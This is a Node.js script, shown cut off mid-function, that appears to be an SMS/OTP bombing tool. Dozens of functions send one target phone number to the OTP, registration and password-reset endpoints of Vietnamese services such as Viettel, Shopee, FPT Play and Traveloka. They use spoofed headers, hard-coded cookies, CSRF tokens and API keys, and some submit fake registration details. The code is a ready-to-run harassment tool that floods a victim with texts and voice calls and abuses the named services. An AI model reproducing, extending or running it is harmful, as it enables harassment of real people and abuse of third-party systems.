'use strict';

const https = require('https');
const http = require('http');
const readline = require('readline');
const { URL } = require('url');

// ─── helpers ────────────────────────────────────────────────────────────────

const lastNames   = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng'];
const middleNames = ['Vân', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh'];
const firstNames  = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy'];

function generateRandomName() {
  const last   = lastNames[Math.floor(Math.random() * lastNames.length)];
  const mid    = Math.random() > 0.5 ? middleNames[Math.floor(Math.random() * middleNames.length)] : '';
  const first  = firstNames[Math.floor(Math.random() * firstNames.length)];
  return [last, mid, first].filter(Boolean).join(' ');
}

function generateRandomId(len = 32) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let out = '';
  for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
  return out;
}

function formatDeviceId(id) {
  return `${id.slice(0,8)}-${id.slice(8,12)}-${id.slice(12,16)}-${id.slice(16,20)}-${id.slice(20)}`;
}

const randomId       = generateRandomId();
const formattedDeviceId = formatDeviceId(randomId);

/**
 * Minimal fetch-like wrapper using Node built-ins only (no deps needed).
 * Returns { status, text, json }.
 *
 * opts: { method, headers, body, params, rejectUnauthorized }
 */
function request(urlStr, opts = {}) {
  return new Promise((resolve, reject) => {
    let parsedUrl;
    try {
      parsedUrl = new URL(urlStr);
    } catch (e) { return reject(e); }

    if (opts.params) {
      for (const [k, v] of Object.entries(opts.params)) {
        parsedUrl.searchParams.set(k, v);
      }
    }

    const isHttps = parsedUrl.protocol === 'https:';
    const lib = isHttps ? https : http;

    const reqOpts = {
      hostname : parsedUrl.hostname,
      port     : parsedUrl.port || (isHttps ? 443 : 80),
      path     : parsedUrl.pathname + parsedUrl.search,
      method   : opts.method || 'GET',
      headers  : opts.headers || {},
      rejectUnauthorized: opts.rejectUnauthorized !== false,
    };

    const req = lib.request(reqOpts, (res) => {
      const chunks = [];
      res.on('data', c => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8');
        resolve({
          status : res.statusCode,
          text,
          json   : () => { try { return JSON.parse(text); } catch { return null; } },
        });
      });
    });

    req.on('error', reject);
    req.setTimeout(15000, () => { req.destroy(new Error('timeout')); });

    if (opts.body) req.write(opts.body);
    req.end();
  });
}

function post(url, opts = {}) { return request(url, { ...opts, method: 'POST' }); }
function get(url, opts = {})  { return request(url, { ...opts, method: 'GET'  }); }

function cookieStr(obj) {
  return Object.entries(obj).map(([k,v]) => `${k}=${v}`).join('; ');
}

function urlEncoded(obj) {
  return Object.entries(obj).map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
}

// ─── OTP functions ───────────────────────────────────────────────────────────

async function send_otp_via_sapo(sdt) {
  try {
    const cookies = {
      landing_page: 'https://www.sapo.vn/',
      start_time: '07/30/2024 16:21:32',
      lang: 'vi',
      G_ENABLED_IDPS: 'google',
      source: 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
      referral: 'https://accounts.sapo.vn/',
      pageview: '7',
    };
    const res = await post('https://www.sapo.vn/fnb/sendotp', {
      headers: {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.sapo.vn',
        'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'cookie': cookieStr(cookies),
      },
      body: urlEncoded({ phonenumber: sdt }),
    });
    console.log('Sapo OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('sapo:', e.message); }
}

async function send_otp_via_viettel(sdt) {
  try {
    const res = await post('https://viettel.vn/api/getOTPLoginCommon', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Requested-With': 'XMLHttpRequest',
        'cookie': 'laravel_session=ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf; redirectLogin=https://viettel.vn/myviettel',
      },
      body: JSON.stringify({ phone: sdt, typeCode: 'DI_DONG', actionCode: 'myviettel://login_mobile', type: 'otp_login' }),
    });
    console.log('Viettel OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('viettel:', e.message); }
}

async function send_otp_via_medicare(sdt) {
  try {
    const res = await post('https://medicare.vn/api/otp', {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ mobile: sdt, mobile_country_prefix: '84' }),
    });
    console.log('Medicare OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('medicare:', e.message); }
}

async function send_otp_via_tv360(sdt) {
  try {
    const res = await post('https://tv360.vn/public/v1/auth/get-otp-login', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'tz': 'Asia/Bangkok',
        'cookie': 'NEXT_LOCALE=vi',
      },
      body: JSON.stringify({ msisdn: sdt }),
    });
    console.log('TV360 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('tv360:', e.message); }
}

async function send_otp_via_dienmayxanh(sdt) {
  try {
    const res = await post('https://www.dienmayxanh.com/LoginV2/GetVerifyCode', {
      headers: {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.dienmayxanh.com',
        'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'SvID=new2690|Zqilx|Zqilw',
      },
      body: urlEncoded({ phone: sdt }),
    });
    console.log('DienmayXanh OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('dienmayxanh:', e.message); }
}

async function send_otp_via_kingfoodmart(sdt) {
  try {
    const res = await post('https://api.onelife.vn/v1/gateway/', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({
        operationName: 'SendOtp',
        variables: { input: { phone: sdt, captchaSignature: 'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD' } },
        query: 'mutation SendOtp($input: SendOtpInput!) { sendOtp(input: $input) { otpTrackingId __typename } }',
      }),
    });
    console.log('KingFoodMart OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('kingfoodmart:', e.message); }
}

async function send_otp_via_mocha(sdt) {
  try {
    const res = await post(`https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn=${sdt}&languageCode=vi`, {
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://video.mocha.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
    });
    console.log('Mocha OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('mocha:', e.message); }
}

async function send_otp_via_fptdk(sdt) {
  try {
    const res = await post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'x-did': 'A0EB7FD5EA287DBF',
      },
      body: JSON.stringify({ phone: sdt, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' }),
    });
    console.log('FPT DK OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('fptdk:', e.message); }
}

async function send_otp_via_fptmk(sdt) {
  try {
    const res = await post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://fptplay.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'x-did': 'A0EB7FD5EA287DBF',
      },
      body: JSON.stringify({ phone: sdt, country_code: 'VN', client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8' }),
    });
    console.log('FPT MK OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('fptmk:', e.message); }
}

async function send_otp_via_VIEON(sdt) {
  try {
    const res = await post('https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjI1MTA3NDksImp0aSI6IjQ3OGJkODI1MmY2ODdkOTExNzdlNmJhM2MzNTE5ZDNkIiwiYXVkIjoiIiwiaWF0IjoxNzIyMzM3OTQ5LCJpc3MiOiJWaWVPbiJ9.ignore',
        'origin': 'https://vieon.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ username: sdt, country_code: 'VN', model: 'Windows 10', device_id: 'f812a55d1d5ee2b87a927833df2608bc', device_name: 'Edge/127', device_type: 'desktop', platform: 'web', ui: '012021' }),
    });
    console.log('VIEON OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vieon:', e.message); }
}

async function send_otp_via_ghn(sdt) {
  try {
    const res = await post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone: sdt, type: 'register' }),
    });
    console.log('GHN OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('ghn:', e.message); }
}

async function send_otp_via_lottemart(sdt) {
  try {
    const res = await post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.lottemart.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ username: sdt, case: 'register' }),
    });
    console.log('LotteMart OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('lottemart:', e.message); }
}

async function send_otp_via_DONGCRE(sdt) {
  try {
    const res = await post('https://api.vayvnd.vn/v2/users/password-reset', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ login: sdt, trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2' }),
    });
    console.log('DONGCRE OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('dongcre:', e.message); }
}

async function send_otp_via_shopee(sdt) {
  try {
    const res = await post('https://shopee.vn/api/v4/otp/get_settings_v2', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://shopee.vn',
        'x-api-source': 'pc',
        'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'csrftoken=PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs; SPC_F=eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq',
      },
      body: JSON.stringify({ operation: 8, encrypted_phone: '', phone: sdt, supported_channels: [1,2,3,6,0,5], support_session: true }),
    });
    console.log('Shopee OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('shopee:', e.message); }
}

async function send_otp_via_TGDD(sdt) {
  try {
    const res = await post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', {
      headers: {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.thegioididong.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'TBMCookie_3209819802479625248=894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=',
      },
      body: urlEncoded({ MobilePhone: sdt, __RequestVerificationToken: 'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs' }),
    });
    console.log('TGDD OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('tgdd:', e.message); }
}

async function send_otp_via_fptshop(sdt) {
  try {
    const res = await post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/json',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ fromSys: 'WEBKHICT', otpType: '0', phoneNumber: sdt }),
    });
    console.log('FPTShop OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('fptshop:', e.message); }
}

async function send_otp_via_WinMart(sdt) {
  try {
    const res = await post('https://api-crownx.winmart.vn/iam/api/v1/user/register', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'authorization': 'Bearer undefined',
        'origin': 'https://winmart.vn',
        'x-api-merchant': 'WCM',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ firstName: 'Nguyễn Quang Ngọc', phoneNumber: sdt, masanReferralCode: '', dobDate: '2024-07-26', gender: 'Male' }),
    });
    console.log('WinMart OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('winmart:', e.message); }
}

async function send_otp_via_vietloan(sdt) {
  try {
    const res = await post('https://vietloan.vn/register/phone-resend', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991',
      },
      body: urlEncoded({ phone: sdt, _token: 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi' }),
    });
    console.log('Vietloan OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vietloan:', e.message); }
}

async function send_otp_via_lozi(sdt) {
  try {
    const res = await post('https://mocha.lozi.vn/v1/invites/use-app', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://lozi.vn',
        'x-access-token': 'unknown',
        'x-city-id': '50',
        'x-lozi-client': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ countryCode: '84', phoneNumber: sdt }),
    });
    console.log('Lozi OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('lozi:', e.message); }
}

async function send_otp_via_F88(sdt) {
  try {
    const res = await post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://f88.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ FullName: generateRandomName(), Phone: sdt, DistrictCode: '024', ProvinceCode: '02', AssetType: 'Car', IsChoose: '1', ShopCode: '', Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan', FormType: 1 }),
    });
    console.log('F88 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('f88:', e.message); }
}

async function send_otp_via_vinpearl(sdt) {
  try {
    const res = await post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'authorization': 'Bearer undefined',
        'origin': 'https://booking.vinpearl.com',
        'x-display-currency': 'VND',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ channel: 'vpt', username: sdt, type: 1, OtpChannel: 1 }),
    });
    console.log('Vinpearl OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('vinpearl:', e.message); }
}

async function send_otp_via_traveloka(sdt) {
  try {
    if (sdt.startsWith('09')) sdt = '+84' + sdt.slice(1);
    const res = await post('https://www.traveloka.com/api/v2/user/signup', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://www.traveloka.com',
        'x-domain': 'user',
        'x-route-prefix': 'vi-vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'countryCode=VN',
      },
      body: JSON.stringify({ fields: [], data: { userLoginMethod: 'PN', username: sdt }, clientInterface: 'desktop' }),
    });
    console.log('Traveloka OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('traveloka:', e.message); }
}

async function send_otp_via_dongplus(sdt) {
  try {
    const res = await post('https://api.dongplus.vn/api/v2/user/check-phone', {
      headers: {
        'accept': '*/*',
        'content-type': 'application/json',
        'ert': 'DP:f9adae3150090780ee8cfac00fc7cc13',
        'origin': 'https://dongplus.vn',
        'rt': '2024-07-30T22:25:19+07:00',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ mobile_phone: sdt }),
    });
    console.log('DongPlus OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('dongplus:', e.message); }
}

async function send_otp_via_longchau(sdt) {
  try {
    const res = await post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'x-channel': 'EStore',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt, otpType: 0, fromSys: 'WEBKHLC' }),
    });
    console.log('LongChau OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('longchau:', e.message); }
}

async function send_otp_via_longchau1(sdt) {
  try {
    const res = await post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'x-channel': 'EStore',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt, otpType: 2, fromSys: 'WEBKHLC' }),
    });
    console.log('LongChau1 OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('longchau1:', e.message); }
}

async function send_otp_via_galaxyplay(sdt) {
  try {
    const res = await post('https://api.glxplay.io/account/phone/verify?phone=' + encodeURIComponent(sdt), {
      headers: {
        'accept': '*/*',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAifQ.ignore',
        'origin': 'https://galaxyplay.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'x-requested-with': 'XMLHttpRequest',
      },
    });
    console.log('GalaxyPlay OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('galaxyplay:', e.message); }
}

async function send_otp_via_emartmall(sdt) {
  try {
    const res = await post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', {
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://emartmall.com.vn',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'emartsess=30rqcrlv76osg3ghra9qfnrt43; language=vietn; currency=VND',
      },
      body: urlEncoded({ mobile: sdt }),
    });
    console.log('EmartMall OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('emartmall:', e.message); }
}

async function send_otp_via_ahamove(sdt) {
  try {
    const res = await post('https://api.ahamove.com/api/v3/public/user/login', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ mobile: sdt, country_code: 'VN', firebase_sms_auth: true }),
    });
    console.log('Ahamove OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('ahamove:', e.message); }
}

async function send_otp_via_ViettelMoney(sdt) {
  try {
    const res = await post('https://api8.viettelpay.vn/customer/v2/accounts/register', {
      headers: {
        'User-Agent': 'Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1',
        'Content-Type': 'application/json',
        'app-version': '8.8.8',
        'product': 'VIETTELPAY',
        'type-os': 'ios',
        'accept-language': 'vi',
        'imei': 'DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD',
        'device-name': 'iPhone',
        'os-version': '16.0',
        'authority-party': 'APP',
      },
      body: JSON.stringify({ identityType: 'msisdn', identityValue: sdt, type: 'REGISTER' }),
    });
    console.log('ViettelMoney OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('viettelmoney:', e.message); }
}

async function send_otp_via_xanhsmsms(sdt) {
  try {
    if (sdt.startsWith('09')) sdt = '+84' + sdt.slice(1);
    const res = await post('https://api.xanhsm.com/api/v1/auth/send-otp', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://xanhsm.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt, type: 'REGISTER' }),
    });
    console.log('XanhSM-SMS OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('xanhsmsms:', e.message); }
}

async function send_otp_via_xanhsmzalo(sdt) {
  try {
    if (sdt.startsWith('09')) sdt = '+84' + sdt.slice(1);
    const res = await post('https://api.xanhsm.com/api/v1/auth/send-otp', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://xanhsm.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phoneNumber: sdt, type: 'REGISTER', channel: 'ZALO' }),
    });
    console.log('XanhSM-Zalo OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('xanhsmzalo:', e.message); }
}

async function send_otp_via_popeyes(sdt) {
  try {
    const res = await post('https://api.popeyes.vn/api/v1/register', {
      headers: {
        'accept': 'application/json',
        'content-type': 'application/json',
        'ppy': 'CWNOBV',
        'origin': 'https://popeyes.vn',
        'x-client': 'WebApp',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ phone: sdt, firstName: 'Nguyễn', lastName: 'Ngọc', email: 'th456do1g110@hotmail.com', password: 'et_SECUREID()' }),
    });
    console.log('Popeyes OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('popeyes:', e.message); }
}

async function send_otp_via_ACHECKIN(sdt) {
  try {
    const url2 = 'https://id.acheckin.vn/api/graphql/v2/mobile';
    const headers2 = {
      'User-Agent': 'AppotaHome/29 CFNetwork/1474 Darwin/23.0.0',
      'Content-Type': 'application/json',
      'accept-language': 'vi-VN,vi;q=0.9',
      'authorization': 'undefined',
    };
    await post(url2, { headers: headers2, body: JSON.stringify({ operationName: 'IdCheckPhoneNumber', variables: { phone_number: sdt }, query: 'query IdCheckPhoneNumber($phone_number: String!) { mutation: checkPhoneNumber(phone_number: $phone_number) }' }) });
    const res = await post(url2, { headers: headers2, body: JSON.stringify({ operationName: 'RequestVoiceOTP', variables: { phone_number: sdt, action: 'REGISTER', hash: '6af5e4ed78ee57fe21f0d405c752798f' }, query: 'mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) { requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash) }' }) });
    console.log('ACHECKIN OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('acheckin:', e.message); }
}

async function send_otp_via_APPOTA(sdt) {
  try {
    const h = {
      'User-Agent': 'appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0',
      'Content-Type': 'application/json',
      'client-version': '5.2.10',
      'aw-device-id': formattedDeviceId,
      'language': 'vi',
      'client-authorization': 'GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP',
      'x-device-id': formattedDeviceId,
      'x-client-build': '119',
      'x-client-version': '5.2.10',
      'platform': 'ios',
      'accept-language': 'vi-vn',
      'x-client-platform': 'ios',
      'ref-client': 'appwallet',
    };
    const res = await post('https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code', {
      headers: h,
      body: JSON.stringify({ phone_number: sdt, sender: 'SMS', ts: 1722417441, signature: '5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5' }),
    });
    console.log('APPOTA OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('appota:', e.message); }
}

async function send_otp_via_Watsons(sdt) {
  try {
    const res = await post('https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep?lang=vi', {
      headers: {
        'User-Agent': 'WTCVN/24050.8.0 (iOS/17.0.2)',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'x-session-token': '5b3f554c05258ea55ab506a1ffc7aa8d',
        'accept-language': 'vi',
        'env': 'prod',
        'x-app-version': '24050.8.0',
        'x-app-name': 'Watsons%20VN',
        'cookie': 'authorization=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; token_type=guest',
      },
      body: JSON.stringify({ otpTokenRequest: { action: 'REGISTRATION', type: 'SMS', countryCode: '84', target: sdt }, defaultAddress: { mobileNumberCountryCode: '84', mobileNumber: sdt }, mobileNumber: sdt }),
    });
    console.log('Watsons OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('watsons:', e.message); }
}

async function send_otp_via_hoangphuc(sdt) {
  try {
    const res = await post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', {
      headers: {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hoang-phuc.com',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'cookie': 'form_key=fm7TzaicsnmIyKbm; private_content_version=e7d88709c6ccef5f8c32a41289ece818',
      },
      body: urlEncoded({ action_type: '1', tel: sdt }),
    });
    console.log('HoangPhuc OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('hoangphuc:', e.message); }
}

async function send_otp_via_fmcomvn(sdt) {
  try {
    const res = await post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'authorization': 'Bearer',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-fromweb': 'true',
        'origin': 'https://fm.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({ Phone: sdt, LatOfMap: '106', LongOfMap: '108', Browser: '' }),
    });
    console.log('FM.com.vn OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('fmcomvn:', e.message); }
}

async function send_otp_via_Reebokvn(sdt) {
  try {
    const res = await post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'key': '63ea1845891e8995ecb2304b558cdeab',
        'origin': 'https://reebok.com.vn',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'timestamp': Date.now().toString(),
      },
      body: JSON.stringify({ phoneNumber: sdt }),
    });
    console.log('Reebok OTP:', res.text.slice(0, 120));
  } catch (e) { console.error('reebok:', e.message); }
}

async function send_otp_via_thefaceshop(sdt) {
  try {
    const res = await post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', {
      headers: {
